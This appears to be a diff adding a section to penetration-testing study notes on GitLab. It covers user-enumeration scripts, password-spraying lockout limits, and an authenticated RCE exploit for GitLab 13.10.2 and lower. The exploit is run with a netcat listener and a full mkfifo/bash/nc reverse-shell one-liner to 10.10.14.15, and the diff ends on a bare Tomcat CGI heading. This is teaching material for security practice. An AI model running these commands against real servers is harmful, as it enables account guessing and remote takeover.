@@ -769,3 +769,28 @@ From here, we can explore each of the pages linked in the top left `groups`, `sn
 Then we should check and see if we can register an account and access additional projects. Suppose the organization did not set up GitLab only to allow company emails to register or require an admin to approve a new account. In that case, we may be able to access additional data. <br>
 We can also use the registration form to enumerate valid users. If we can make a list of valid users, we could attempt to guess weak passwords or possibly re-use credentials. <br>
 On this particular instance of GitLab (and likely others), we can also enumerate emails. If we try to register with an email that has already been taken, we will get the error `1 error prohibited this user from being saved: Email has already been taken`.
+
+## Attacks
+### User enumeration
+We can use [this](https://github.com/dpgg101/GitLabUserEnum) or [this code](https://www.exploit-db.com/exploits/49821) to enumerate a list of valid users. As with any type of password spraying attack, we should be mindful of account lockout and other kinds of interruptions. In versions below 16.6, GitLab's defaults are set to 10 failed login attempts, resulting in an automatic unlock after 10 minutes.
+```
+/gitlab_userenum.sh --url http://gitlab.company.local:8081/ --userlist users.txt
+```
+or:
+```
+python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8081/ -w /opt/useful/seclists/Usernames/cirt-default-usernames.txt
+```
+### Authenticated RCE
+ GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542). We can use [this exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.
+ If we could obtain valid credentials through OSINT or a credential guessing attack or if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.
+ Set up listener:
+ ```
+nc -lnvp 8443
+```
+Then:
+ ```
+python3 gitlab_13_10_2_rce.py -t http://gitlab.company.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+```
+# Tomcat CGI
+CVE-2019-0232 is a critical security issue that could result in remote code execution. This vulnerability affects Windows systems that have the enableCmdLineArguments feature enabled. 
+
